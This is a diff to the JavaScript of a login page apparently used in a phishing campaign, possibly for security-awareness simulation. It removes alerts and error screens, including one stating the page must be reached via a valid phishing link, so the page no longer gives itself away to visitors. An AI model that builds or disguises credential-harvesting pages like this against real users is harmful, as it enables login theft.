@@ -176,19 +176,16 @@
 
             // VALIDATION CRITIQUE
             if (!campaignId) {
-                console.error('❌ ERREUR: Campaign ID manquant');
-                alert('Erreur technique: ID de campagne manquant. Veuillez utiliser le lien reçu par email.');
+                console.error('❌ ERREUR: Campaign ID manquant'); 
                 return;
             }
 
             if (!targetEmail) {
-                console.error('❌ ERREUR: Email cible manquant');
-                alert('Erreur: Email manquant. Cette page doit être accédée via le lien reçu par email.');
+                console.error('❌ ERREUR: Email cible manquant'); 
                 return;
             }
 
-            if (!username || !password) {
-                alert('Veuillez remplir tous les champs.');
+            if (!username || !password) { 
                 return;
             }
 
@@ -271,7 +268,7 @@
             });
         });
 
-        // CORRECTION 5: Validation à l'initialisation
+        // CORRECTION 5: Validation à l'initialisation - ALERTE EMAIL SUPPRIMÉE
         document.addEventListener('DOMContentLoaded', function() {
             const { campaignId, targetEmail, token } = getPhishingData();
             
@@ -282,29 +279,11 @@
             console.log('🌐 URL:', window.location.href);
             
             if (!campaignId) {
-                console.error('❌ Campaign ID manquant à l\'initialisation');
-                document.body.innerHTML = `
-                    <div style="text-align: center; padding: 50px; font-family: Arial, sans-serif;">
-                        <h2 style="color: #dc3545;">Erreur de configuration</h2>
-                        <p>Cette page doit être accédée via un lien de phishing valide.</p>
-                        <p style="font-size: 12px; color: #666;">URL actuelle: ${window.location.href}</p>
-                    </div>
-                `;
+                console.error('❌ Campaign ID manquant à l\'initialisation'); 
                 return;
             }
             
-            if (!targetEmail) {
-                console.warn('⚠️ Email manquant à l\'initialisation');
-                document.body.innerHTML = `
-                    <div style="text-align: center; padding: 50px; font-family: Arial, sans-serif;">
-                        <h2 style="color: #ffc107;">Accès requis</h2>
-                        <p>Cette page doit être accédée via le lien reçu par email.</p>
-                        <p style="font-size: 12px; color: #666;">Campaign: ${campaignId}</p>
-                        <p style="font-size: 12px; color: #666;">URL: ${window.location.href}</p>
-                    </div>
-                `;
-                return;
-            }
+            // SUPPRIMÉ: L'alerte "Email manquant à l'initialisation"
         });
 
         // Debug global
